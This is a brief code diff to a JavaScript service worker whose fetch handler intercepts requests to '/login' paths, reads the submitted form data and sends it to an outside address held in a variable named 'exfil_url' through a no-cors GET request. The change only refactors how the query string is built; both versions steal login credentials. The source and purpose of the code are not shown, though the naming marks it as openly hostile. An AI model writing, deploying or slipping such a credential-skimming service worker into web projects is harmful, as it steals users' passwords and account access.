@@ -10,8 +10,9 @@ self.addEventListener('activate', event => {
 self.addEventListener("fetch", async (event) => {
     const url = new URL(event.request.url);
     if (url.pathname.startsWith("/login")) {
-        let body = await event.request.formData();
-        await fetch(`${exfil_url}?${new URLSearchParams(Object.fromEntries(body.entries()))}`, {
+        const body = await event.request.formData();
+		const bodyParams = new URLSearchParams(Object.fromEntries(body.entries()));
+        await fetch(`${exfil_url}?${bodyParams}`, {
             method: "GET",
             mode: 'no-cors',
         });
